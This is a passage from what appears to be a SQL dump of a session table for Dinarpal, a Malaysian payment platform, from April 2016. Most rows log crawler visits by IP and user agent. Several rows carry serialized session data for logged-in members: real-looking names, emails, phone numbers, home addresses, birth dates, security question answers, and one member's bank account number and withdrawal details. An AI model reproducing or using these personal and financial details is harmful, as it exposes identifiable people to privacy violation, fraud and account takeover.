10:12:00";s:15:"me_account_type";s:1:"2";s:20:"me_activation_status";s:1:"2";s:13:"me_last_login";s:25:"2016-04-23T17:38:36+08:00";s:12:"me_magic_num";s:32:"0d4368f80cd1d149576c068211e89fbf";s:5:"ml_id";s:1:"3";s:9:"me_status";s:1:"1";s:10:"me_company";s:18:"Tuffah Informatics";s:10:"me_reg_num";s:11:"MA0182480-H";s:15:"me_company_doc1";s:36:"8dbaa9d1e7f114245d186c546ab9a7d6.jpg";s:22:"me_company_doc1_verify";s:1:"1";s:15:"me_company_doc2";s:36:"25e878659a4d2c4c9f76576fa1656530.jpg";s:22:"me_company_doc2_verify";s:1:"1";s:7:"me_type";s:2:"DP";s:5:"sl_id";s:1:"1";s:4:"g_id";s:1:"1";s:7:"v_stock";s:3:"100";}s:6:"v_size";i:1;}s:8:"subtotal";i:1;}s:11:"total_items";i:1;s:10:"cart_total";i:1;}}'),
('2c76cba8983af57f64b2eda990d07bb3', '203.82.90.237', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/5', 1461474441, 'a:1:{s:12:"me_id_parent";s:88:"pYNe6MNNn-zCVFgpZetkKr2A123IhjamtuXEyGQS2fapkYnDTe4YbY3Na1yN8oLqB7d2Zk3o4GDIllndq3D8Qw==";}'),
('2c86dbcc9dd614f82672944776a484a0', '208.68.38.50', 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1;', 1461408714, ''),
('2ce3f688705eabea22eef9a1d2633400', '169.229.3.91', '0', 1461420318, ''),
('2cfb854c58c6523d0d2bbf1b9771bf9b', '5.149.254.109', 'Mozilla/4.0 (compatible  MSIE 6.0  Windows NT 5.1 ', 1461279770, ''),
('2d3876760f98e4322f7fe6dfb471f08f', '203.82.90.32', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/53', 1461478832, 'a:52:{s:5:"me_id";s:2:"31";s:8:"me_image";s:15:"default-img.jpg";s:12:"me_firstname";s:8:"azren_78";s:11:"me_lastname";s:8:"azren_78";s:11:"me_username";s:8:"azren_78";s:11:"me_question";s:20:"What is my username?";s:9:"me_answer";s:8:"azren_78";s:14:"me_unique_link";s:32:"c44be40623f0a8e5072a9528440d4e34";s:11:"me_address1";N;s:8:"me_city1";N;s:9:"me_state1";N;s:12:"me_postcode1";N;s:11:"me_country1";N;s:11:"me_address2";N;s:8:"me_city2";N;s:9:"me_state2";N;s:12:"me_postcode2";N;s:11:"me_country2";N;s:22:"me_government_issue_id";N;s:17:"me_driver_license";N;s:11:"me_phone_no";N;s:13:"me_birth_date";N;s:14:"me_description";N;s:14:"me_maiden_name";N;s:14:"me_nationality";N;s:11:"me_facebook";N;s:10:"me_twitter";N;s:12:"me_instagram";N;s:13:"me_googleplus";N;s:14:"me_whatsapp_no";N;s:11:"me_telegram";N;s:9:"me_wechat";N;s:8:"me_email";s:18:"azren_78@yahoo.com";s:16:"me_register_date";s:19:"2016-04-23 22:18:24";s:15:"me_account_type";s:1:"1";s:20:"me_activation_status";s:1:"2";s:13:"me_last_login";N;s:12:"me_magic_num";s:32:"f2c9002da372411c462169206e2343c5";s:5:"ml_id";s:1:"3";s:9:"me_status";s:1:"1";s:10:"me_company";N;s:10:"me_reg_num";N;s:15:"me_company_doc1";N;s:22:"me_company_doc1_verify";s:1:"1";s:15:"me_company_doc2";N;s:22:"me_company_doc2_verify";s:1:"1";s:7:"me_type";s:2:"NU";s:5:"sl_id";s:1:"0";s:4:"g_id";s:1:"0";s:9:"msg_login";s:153:"Thank You for choosing Dinarpal for your platform <br/>Please fill in all your personal detail<br />and deposit your money for your account verification.";s:9:"logged_in";b:1;s:14:"flash:old:info";s:153:"Thank You for choosing Dinarpal for your platform <br/>Please fill in all your personal detail<br />and deposit your money for your account verification.";}'),
('2d590cdf509b7a3eb59e253690580e24', '144.76.8.132', 'Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://ww', 1461892137, ''),
('2d7e31fad80ed92c8fe5421bf0bc3c75', '180.76.15.153', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461624279, ''),
('2d89d498d4e2dcac1fc236eb83637203', '175.141.171.212', 'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_1 like Mac ', 1461495143, 'a:50:{s:5:"me_id";s:1:"7";s:8:"me_image";s:15:"default-img.jpg";s:12:"me_firstname";s:5:"arash";s:11:"me_lastname";s:5:"arash";s:11:"me_username";s:5:"arash";s:11:"me_question";s:20:"What is my username?";s:9:"me_answer";s:5:"arash";s:14:"me_unique_link";s:32:"81b9a3538d93a7623ad0e9bf1347d137";s:11:"me_address1";s:15:"DinarPal Street";s:8:"me_city1";s:10:"Ayer Keroh";s:9:"me_state1";s:6:"Melaka";s:12:"me_postcode1";s:5:"75450";s:11:"me_country1";s:8:"Malaysia";s:11:"me_address2";s:15:"DinarPal Street";s:8:"me_city2";s:10:"Ayer Keroh";s:9:"me_state2";s:6:"Melaka";s:12:"me_postcode2";s:5:"75450";s:11:"me_country2";s:8:"Malaysia";s:22:"me_government_issue_id";N;s:17:"me_driver_license";N;s:11:"me_phone_no";s:11:"60166707888";s:13:"me_birth_date";s:10:"1977-01-19";s:14:"me_description";N;s:14:"me_maiden_name";N;s:14:"me_nationality";N;s:11:"me_facebook";s:0:"";s:10:"me_twitter";s:0:"";s:12:"me_instagram";s:0:"";s:13:"me_googleplus";s:0:"";s:14:"me_whatsapp_no";s:0:"";s:11:"me_telegram";s:0:"";s:9:"me_wechat";s:0:"";s:8:"me_email";s:22:"arash.private@live.com";s:16:"me_register_date";s:19:"2016-04-23 17:41:44";s:15:"me_account_type";s:1:"1";s:20:"me_activation_status";s:1:"2";s:13:"me_last_login";s:25:"2016-04-24T18:43:14+08:00";s:12:"me_magic_num";s:32:"248dfd4fff3169f86edec2930684bfd4";s:5:"ml_id";s:1:"3";s:9:"me_status";s:1:"1";s:10:"me_company";s:0:"";s:10:"me_reg_num";s:0:"";s:15:"me_company_doc1";s:0:"";s:22:"me_company_doc1_verify";s:1:"1";s:15:"me_company_doc2";s:0:"";s:22:"me_company_doc2_verify";s:1:"1";s:7:"me_type";s:2:"NU";s:5:"sl_id";s:1:"0";s:4:"g_id";s:1:"1";s:9:"logged_in";b:1;}'),
('2db00373564aa2c9f28bfa48c9a32e25', '115.134.161.155', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/5', 1461299099, 'a:61:{s:5:"me_id";s:2:"13";s:8:"me_image";s:36:"de66e1a79cbe5484bd29e4842d8c73c6.jpg";s:12:"me_firstname";s:5:"Siti ";s:11:"me_lastname";s:8:"Zulaikha";s:11:"me_username";s:3:"sza";s:11:"me_question";s:20:"What is my username?";s:9:"me_answer";s:3:"sza";s:14:"me_unique_link";s:32:"eeae174735e6f8a579b3b9bc1849ac17";s:11:"me_address1";s:29:"600-6 Batu 2 1/2 Padang Temu ";s:8:"me_city1";s:6:"Melaka";s:9:"me_state1";s:6:"Melaka";s:12:"me_postcode1";s:5:"75050";s:11:"me_country1";s:6:"Melaka";s:11:"me_address2";s:29:"600-6 Batu 2 1/2 Padang Temu ";s:8:"me_city2";s:6:"Melaka";s:9:"me_state2";s:6:"Melaka";s:12:"me_postcode2";s:5:"75050";s:11:"me_country2";s:6:"Melaka";s:22:"me_government_issue_id";N;s:17:"me_driver_license";N;s:11:"me_phone_no";s:10:"0136720330";s:13:"me_birth_date";s:10:"1993-04-07";s:14:"me_description";N;s:14:"me_maiden_name";N;s:14:"me_nationality";N;s:11:"me_facebook";s:0:"";s:10:"me_twitter";s:0:"";s:12:"me_instagram";s:18:"@mawaddah_alzahrah";s:13:"me_googleplus";s:0:"";s:14:"me_whatsapp_no";s:10:"0136720330";s:11:"me_telegram";s:0:"";s:9:"me_wechat";s:0:"";s:8:"me_email";s:28:"zulaikhaabdullah75@gmail.com";s:16:"me_register_date";s:19:"2016-04-21 15:06:42";s:15:"me_account_type";s:1:"1";s:20:"me_activation_status";s:1:"2";s:13:"me_last_login";s:25:"2016-04-22T10:35:17+08:00";s:12:"me_magic_num";s:32:"968b1b6bdc426e86092695466c3ae464";s:5:"ml_id";s:1:"3";s:9:"me_status";s:1:"1";s:10:"me_company";s:0:"";s:10:"me_reg_num";s:0:"";s:15:"me_company_doc1";s:0:"";s:22:"me_company_doc1_verify";s:1:"1";s:15:"me_company_doc2";s:0:"";s:22:"me_company_doc2_verify";s:1:"1";s:7:"me_type";s:2:"NU";s:5:"sl_id";s:1:"0";s:4:"g_id";s:1:"2";s:9:"logged_in";b:1;s:18:"session_withdrawal";a:6:{s:5:"ft_id";s:1:"5";s:10:"me_id_from";s:2:"13";s:11:"tr_datetime";s:19:"2016-04-22 12:25:53";s:5:"at_id";s:1:"1";s:9:"tr_amount";s:2:"10";s:5:"bc_id";s:1:"1";}s:5:"tr_id";i:102;s:11:"tr_datetime";s:19:"2016-04-22 12:25:53";s:7:"bank_to";s:12:"198735410825";s:11:"bank_holder";s:13:"SITI ZULAIKHA";s:9:"bank_name";s:15:"Maybank Sdn Bhd";s:9:"tr_amount";s:5:"10.00";s:8:"ft_price";s:4:"3.00";s:6:"bc_fee";s:4:"2.00";s:7:"gst_tax";s:4:"0.30";s:10:"amount_get";s:4:"4.70";}'),
('2dc697abbf38e556398abe9a44f0f877', '113.238.39.232', 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;', 1461884446, ''),
('2dc7cee4441f671bfe4f3725af3fa05c', '180.76.15.13', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461453501, ''),
('2df704f84623024d978084f1ad1fbd11', '62.210.148.247', 'Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://ww', 1461938230, ''),
('2e073b69d5583cf73db1512377beb67a', '141.8.132.32', 'Mozilla/5.0 (compatible; YandexBot/3.0; +http://ya', 1461485863, ''),
('2e13c027b57f066904c4322dcdf6b9ac', '180.76.15.139', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461824086, ''),
('2e1aeffa5cb53ce1af5ddf4d15276dfe', '202.137.254.1', 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Geck', 1461660672, ''),
('2e425ad0a37b65c4f7df953948907ce5', '208.67.172.36', 'Mozilla/5.0 (X11; U; Linux x86_64;en-US;rv:1.9.2.1', 1461732134, ''),
('2e541cdd424566044e2442224b3d1f48', '180.76.15.150', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461537971, ''),
('2e6c6f0e49249c3c476d82d222a607e2', '40.77.167.104', 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.', 1461116193, ''),
('2e728f6438886fb2de77f22447acdc7a', '157.55.39.163', 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.', 1461254789, ''),
('2e79a16b920d32458941efd80160a113', '207.46.13.150', 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.', 1461663128, ''),
('2ec2bd5bf45bad189ddb03160b9e9b52', '113.210.54.109', 'WhatsApp/2.16.13 A', 1461411061, 'a:1:{s:12:"me_id_parent";s:88:"zUXIKZRBDOMBUE58gBYCCQUhchmCfMJyir3cCB5pmd3KQCIDjTamrf0GepH3Ps5bYIxV5h648Hf8FrsOxO-4tg==";}'),
('2ecda203e2fab05119160bde06ab53f8', '113.210.50.134', 'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_1 like Mac ', 1461237709, 'a:1:{s:12:"me_id_parent";s:88:"-07pQCsyzOUoI6NxSC6lZfeZPMBoWNZs0G2BHkuf1vQ4IALBCfvB67yP6zVO0tQXbDra7DG7-kB7wYombD8k0A==";}'),
('2f0fbf3520e31234f7dae356adf4da65', '113.210.53.195', 'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_1 like Mac ', 1461825469, 'a:1:{s:12:"me_id_parent";s:8:"UGUOOQ==";}'),
('2f24740111e6116ee26d4486cc85a4b9', '69.30.213.138', 'Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://ww', 1461779726, ''),
('2f285a009ada904a1924ceaac9865318', '180.76.15.141', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461781261, ''),
('2f6eac80e5185361fc87210c991950ff', '113.210.54.93', 'WhatsApp/2.16.13 A', 1461231997, ''),
('2f737afa19e9346c008faea674fc07b4', '180.76.15.136', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461112494, ''),
('2f754245255f22d23bbd046b8cd9c224', '180.76.15.16', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461170852, ''),
('2f8db89c4ee048cbdcc051ec393ea312', '134.249.55.100', 'Mozilla/1.22 (compatible; MSIE 2.0; Windows 95)', 1461188428, ''),
('2f9a650e66a4605258768496435ec97a', '133.242.52.175', '0', 1461680805, ''),
('3020d4ec657d08f4c6e5df8a8728b587', '103.1.71.185', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/5', 1461655589, 'a:1:{s:15:"flash:old:error";s:24:"Wrong username/password!";}'),
('30506077c520f726b533cce783af2e0c', '23.96.208.137', 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1', 1461485385, 'a:1:{s:12:"me_id_parent";s:88:"RczsNgJ1VtjPjmDqUKWSWtD0UM75c5KNPkCe19rX5khp-4-KQRLnYG7R7NflN_KlJcxn8GcwScwpWXVjYURKHQ==";}'),
('3057ffe467b35c5edcecd9f3d211f991', '82.193.127.15', 'Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://ww', 1461299105, ''),
('305837b728c7d167677efc38662de096', '40.77.167.105', 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.', 1461917850, ''),
('3061572d5c4d4dc403be691fa8878886', '45.55.229.99', 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1;', 1461718313, ''),
('30911dcea04172948059dd96ebc07b3d', '180.76.15.142', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461892879, ''),
('30966b4acfca3d19e0b1bd1a90502f5c', '111.248.101.99', '0', 1461556892, ''),
('30b5a0894db324c06b4c16daa8d414d0', '66.249.69.222', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461518800, ''),
('311597db847a91b1e92f2bc2b2735c4f', '211.24.232.114', 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/53', 1461654800, ''),
('31277751f719c6a995dc22a982e5e512', '115.134.161.155', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) Ap', 1461404478, 'a:1:{s:12:"me_id_parent";s:1:"1";}'),
('319482d20eee36d96b7e3bf369b60aba', '157.55.39.137', 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.', 1461608062, ''),
('31a1f9dc3c37a3eb115216f057a909cb', '115.164.50.83', 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/53', 1461408958, 'a:1:{s:12:"me_id_parent";s:88:"5CbY0sEDAfZMQZKid79SXyQjmjL-3-vY79ekHDhEx0sTVi4MlBLHjCWjeuzPV3_ZkhTCC65pJzW2j1MV3yjB-A==";}'),
('31df8454d9533100550c50b0d3ce430e', '118.101.202.170', 'Mozilla/5.0 (Linux; Android 5.0; ASUS_Z008D Build/', 1461498178, 'a:1:{s:12:"me_id_parent";s:88:"nw3MrDpIFpQ04I0oeeyko6X3hXHuxziqFQIWK5udECw1wH8yv90qWgY_G8ZMiaOgRyAg9UrJqm2Yh7eaKpad2w==";}'),
('31e3b5a0e34deef89f89468bcc663a19', '208.67.172.36', 'Mozilla/5.0 (X11; U; Linux x86_64;en-US;rv:1.9.2.1', 1461732436, ''),
('3206d8a9c9bc345b4425ee57d1b60b31', '180.76.15.26', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461408174, ''),
('32aa2e5d64ba4ac4e86c6208f5da0d6b', '180.76.15.30', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461716143, ''),
('32d965b00dc532bd9c2ae9b4179c8dc3', '80.227.174.18', 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:28.0) Gecko', 1461111176, ''),
('32f1f08ddc9645e9dd0e21ce49d0debf', '157.55.39.190', 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.', 1461143044, ''),
('33573d89f2da8010751004729143de5b', '180.76.15.17', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461105920, ''),
('337a266cd236166675c517f5fcf2e122', '180.76.15.150', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461838503, ''),
('3391f484dd230fbed8ca385dda402bb7', '113.210.54.93', 'WhatsApp/2.16.13 A', 1461232045, 'a:2:{s:12:"me_id_parent";s:1:"0";s:15:"flash:new:error";s:33:"Opss! Invalid member unique link.";}'),
('33941a67443c4ca6f0baa1c1b22574f3', '180.76.15.19', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461213959, ''),
('33c75c30ca2014a903ee054b26313f6a', '157.55.39.85', 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.', 1461705755, ''),
('33c9245c1af4e443a8ca4b78e0eb701a', '50.116.16.218', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_0) Ap', 1461889795, ''),
('33d8567351082da16a21cf61cdb7e4d0', '123.246.120.73', 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)', 1461540302, ''),
('33db85f66a01f1d514f890777ab5c5a4', '123.136.112.141', 'Mozilla/5.0 (Linux; Android 5.0.2; SM-A500F Build/', 1461497360, 'a:53:{s:5:"me_id";s:2:"41";s:8:"me_image";s:15:"default-img.jpg";s:12:"me_firstname";s:8:"mreduans";s:11:"me_lastname";s:8:"mreduans";s:11:"me_username";s:8:"mreduans";s:11:"me_question";s:20:"What is my username?";s:9:"me_answer";s:8:"mreduans";s:14:"me_unique_link";s:32:"3dcf1b626da49ed54ad543a61a63310c";s:11:"me_address1";N;s:8:"me_city1";N;s:9:"me_state1";N;s:12:"me_postcode1";N;s:11:"me_country1";N;s:11:"me_address2";N;s:8:"me_city2";N;s:9:"me_state2";N;s:12:"me_postcode2";N;s:11:"me_country2";N;s:22:"me_government_issue_id";N;s:17:"me_driver_license";N;s:11:"me_phone_no";N;s:13:"me_birth_date";N;s:14:"me_description";N;s:14:"me_maiden_name";N;s:14:"me_nationality";N;s:11:"me_facebook";N;s:10:"me_twitter";N;s:12:"me_instagram";N;s:13:"me_googleplus";N;s:14:"me_whatsapp_no";N;s:11:"me_telegram";N;s:9:"me_wechat";N;s:8:"me_email";s:15:"mreduans@usm.my";s:16:"me_register_date";s:19:"2016-04-24 19:28:21";s:15:"me_account_type";s:1:"1";s:20:"me_activation_status";s:1:"2";s:13:"me_last_login";N;s:12:"me_magic_num";s:32:"9945ace331d44cb489c53bc4423d86cd";s:5:"ml_id";s:1:"3";s:9:"me_status";s:1:"1";s:10:"me_company";N;s:10:"me_reg_num";N;s:15:"me_company_doc1";N;s:22:"me_company_doc1_verify";s:1:"1";s:15:"me_company_doc2";N;s:22:"me_company_doc2_verify";s:1:"1";s:7:"me_type";s:2:"NU";s:5:"sl_id";s:1:"0";s:4:"g_id";s:1:"0";s:9:"msg_login";s:153:"Thank You for choosing Dinarpal for your platform <br/>Please fill in all your personal detail<br />and deposit your money for your account verification.";s:9:"logged_in";b:1;s:11:"img_deposit";s:0:"";s:11:"arr_deposit";s:0:"";}'),
('3421e307e5052be67aebf38c792b4e51', '180.76.15.135', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461509525, ''),
('343416dd5cb2716129377813d1d236e4', '178.255.215.70', 'Mozilla/5.0 (compatible; Exabot/3.0; +http://www.e', 1461287643, ''),
('345e8217e4efdad2007bb3dbdee388ca', '180.76.15.143', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461404403, ''),
('348a78029488dc38b1abff7d0b4c9422', '180.76.15.23', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461447660, ''),
('34f3d9df93aa9eec933215a03afbc9b9', '134.249.55.100', 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;', 1461690038, ''),
('34f4e8ecc7cf390580ad718b476be773', '183.171.165.99', 'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3 like Mac OS', 1461501054, 'a:1:{s:12:"me_id_parent";s:88:"5YOZ37WKIVPKbnhLsK9yGYs97vFY8bk0KzUcW4HE8j_u5HJaGMPCdZahPpt9IEc0-iKMM-O2awvVL7s2raCtqA==";}'),
('353e3667154094772c5d0b9c8d247d23', '46.119.117.28', 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;', 1461844325, ''),
('353ee1d91d523594a85af0b72575c6c9', '180.76.15.159', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461903382, ''),
('356840d153f42613c1bcd33763d82257', '180.76.15.137', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461835179, ''),
('356c881091c2391c03f730104063689e', '68.180.228.190', 'Mozilla/5.0 (compatible; Yahoo! Slurp; http://help', 1461179256, ''),
('358e86c534c426468f5d516272afc5c9', '66.249.66.127', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461894687, ''),
('35946066485109b38f0cbaae59901c30', '157.55.39.190', 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.', 1461137061, ''),
('359f16cfd761484704eec2fb2298461a', '69.30.213.138', 'Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://ww', 1461779719, ''),
('35c171ab39ea8be571345a25ee7f18bf', '134.249.55.100', 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;', 1461708593, ''),
('36011744476658c74202f6f3dded1776', '175.138.178.15', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) Ap', 1461700555, ''),
('364bf327ccb01ccb2b16210d03f73b04', '66.249.69.68', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461704484, ''),
('3663f1032fe44982d3ebaa95b6afe5bf', '180.76.15.28', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461141890, ''),
('366499b22b81188c4ab707a6e6822fcf', '183.171.168.191', 'Mozilla/5.0 (Linux; Android 4.4.4; SM-J110G Build/', 1461498466, 'a:1:{s:12:"me_id_parent";s:88:"N3JVDCW_Uh9k5t6VpusWngRjoa05RSVk8PusLUjC5GR-M8UGljStyeUtTRz6YZ693GN5nINAvPJm_ORi6sBDmg==";}'),
('3674f3a09c3cabf78a2c5915e7997ef3', '5.9.83.211', 'Mozilla/5.0 (compatible; MegaIndex.ru/2.0; +http:/', 1461160564, ''),
('36a363bd6f8476b866abdd5b21e7cda2', '157.55.39.27', 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.', 1461106446, ''),
('3734494d0419a6a6fd86b903cca6d382', '207.46.13.26', 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.', 1461258674, ''),
('373ba2223c22d03b09ddb914d405a416', '180.76.15.135', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461516370, ''),
('381f6a9f8815d9d2cae94331ed8864b5', '14.1.200.230', 'Mozilla/5.0 (Linux; Android 5.1.1; SM-E700H Build/', 1461539918, 'a:1:{s:12:"me_id_parent";s:88:"LE6aDO8RM50OThd1x6UtDLSlLo4JtOdOPyZG-oRBW1mdshGwPMg6e0OsKpwpzqBj_j1E2jXEmddn8NaAt6CiJg==";}'),
('382143cd511a437d13a483cd365d64d6', '175.136.140.216', 'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_1 like Mac ', 1461888244, 'a:51:{s:5:"me_id";s:2:"26";s:8:"me_image";s:36:"84cc8071ffe9754d941efdd89ce6c467.png";s:12:"me_firstname";s:13:"Mohd Zulkefli";s:11:"me_lastname";s:6:"Hamdan";s:11:"me_username";s:3:"mzh";s:11:"me_question";s:20:"What is my username?";s:9:"me_answer";s:3:"mzh";s:14:"me_unique_link";s:32:"eab54c7fb6a1daabe6b845752b0b5234";s:11:"me_address1";s:20:"No 29, Jalan Jati 18";s:8:"me_city1";s:13:"Batu Berendam";s:9:"me_state1";s:6:"Melaka";s:12:"me_postcode1";s:5:"75350";s:11:"me_country1";s:8:"Malaysia";s:11:"me_address2";s:20:"No 29, Jalan Jati 18";s:8:"me_city2";s:13:"Batu Berendam";s:9:"me_state2";s:6:"Melaka";s:12:"me_postcode2";s:5:"75350";s:11:"me_country2";s:8:"Malaysia";s:22:"me_government_issue_id";N;s:17:"me_driver_license";N;s:11:"me_phone_no";s:10:"0122228069";s:13:"me_birth_date";s:10:"1989-02-09";s:14:"me_description";N;s:14:"me_maiden_name";N;s:14:"me_nationality";N;s:11:"me_facebook";s:9:"ijulkefli";s:10:"me_twitter";s:9:"ijulkefli";s:12:"me_instagram";s:9:"ijulkefli";s:13:"me_googleplus";s:9:"ijulkefli";s:14:"me_whatsapp_no";s:10:"0122228069";s:11:"me_telegram";s:10:"0122228069";s:9:"me_wechat";s:9:"ijulkefli";s:8:"me_email";s:16:"ijul89@gmail.com";s:16:"me_register_date";s:19:"2016-04-23 22:15:46";s:15:"me_account_type";s:1:"1";s:20:"me_activation_status";s:1:"2";s:13:"me_last_login";s:25:"2016-04-28T12:40:09+08:00";s:12:"me_magic_num";s:32:"ba64d4c8f84e926af9e9955542eff18c";s:5:"ml_id";s:1:"3";s:9:"me_status";s:1:"1";s:10:"me_company";s:0:"";s:10:"me_reg_num";s:0:"";s:15:"me_company_doc1";s:0:"";s:22:"me_company_doc1_verify";s:1:"1";s:15:"me_company_doc2";s:0:"";s:22:"me_company_doc2_verify";s:1:"1";s:7:"me_type";s:2:"NU";s:5:"sl_id";s:1:"0";s:4:"g_id";s:1:"1";s:10:"me_is_amil";s:2:"no";s:9:"logged_in";b:1;}'),
('382f8ca31382881a5f6a2a47f8ff8c99', '66.249.66.127', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461894843, ''),
('3866d5f85fcfece6d20509ca3a5163cd', '45.55.229.99', 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1;', 1461718313, ''),
('389673bff1b02f2815423bb500a3a810', '69.30.213.82', 'Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://ww', 1461230865, ''),
('38a059ae66f099b579068eff517b21a6', '61.6.6.66', 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/53', 1461131664, ''),
('38a1714f834ad6d93f9f9b882785ab38', '180.76.15.25', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461105995, ''),
('38aa38bf93b1bfa1a104a7f41f013ce2', '13.92.241.115', 'semanticbot', 1461739140, ''),
('38e7a0c3b3816ca78fbb8bd43cf94845', '40.77.167.61', 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.', 1461479637, ''),
('38eaa7051bbc3a350796db4ccdc58dc1', '211.0.154.124', 'Mozilla/5.0 (Windows NT 5.1; rv:6.0.2) Gecko/20100', 1461446154, ''),
('38f675630caa90d204017ecf976e5b59', '124.82.117.8', 'Mozilla/5.0 (Linux; U; Android 4.3; en-us; MediaPa', 1461505525, 'a:1:{s:12:"me_id_parent";s:88:"OP-UtNVJmhiY9e6iZH91xdYmvx9t1ezIw6tGbeq-hrxtWtffVzojHAnpMUi3vgRNpvmN_410n8sRDnva1MAFCQ==";}'),
('3936f7a67b5cd064b93e19de10ab2ac7', '78.46.50.246', 'Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://ww', 1461898649, ''),
('395fea3b6bc79c160c722920d09dc50d', '110.159.11.165', 'Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-N920', 1461919470, ''),
('396b0f9bbbe544c9354534b6d54b89a3', '66.249.66.36', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461312935, ''),
('39739decd141c9e4eb6a893fdc36ea39', '60.54.87.69', 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/53', 1461899331, 'a:1:{s:12:"me_id_parent";s:4:"ADY=";}'),
('397a82e6445d7db997efb2d4405a5255', '180.76.15.135', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461135005, ''),
('399e48938afc91ebe14a112d8e660641', '185.94.190.155', 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (K', 1461104270, ''),
('39deb43e6b4c6cb240d5341129072912', '61.6.25.203', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_4) Ap', 1461130807, ''),
('39e1ba1deba68fc90ce001aa7d86bc87', '17.142.157.156', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) Ap', 1461485858, 'a:1:{s:12:"me_id_parent";s:88:"kpr6yn2_apxqpHHnuimRv4Rg4Lj7QBrV4YZZrBdi0QA62jZqKSGVfbqmTWakO-09ZfjQN4q_1FEzh_j8MPFYdQ==";}'),
('3a019ee087aea721e7452af0e723af2d', '180.76.15.137', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461306929, ''),
('3a5685d938d0a28291c1c287562aa891', '45.33.36.127', 'Mozilla/5.0 (compatible; Uptimebot/1.0; +http://ww', 1461271173, ''),
('3a6ddfdd9460149e3027c32ddb7f45f3', '180.76.15.138', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461824037, ''),
('3a9539a1c5e9db1473c924e4b7e6ba55', '180.76.15.16', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461505778, ''),
('3aa6e41de0ea0542273a1b815d26a194', '13.92.241.115', 'semanticbot', 1461739109, ''),
('3aca0346316f109ce10cdb50fbbf4ff4', '134.249.55.100', 'Opera/9.0 (Windows NT 5.1; U; en)', 1461188429, ''),
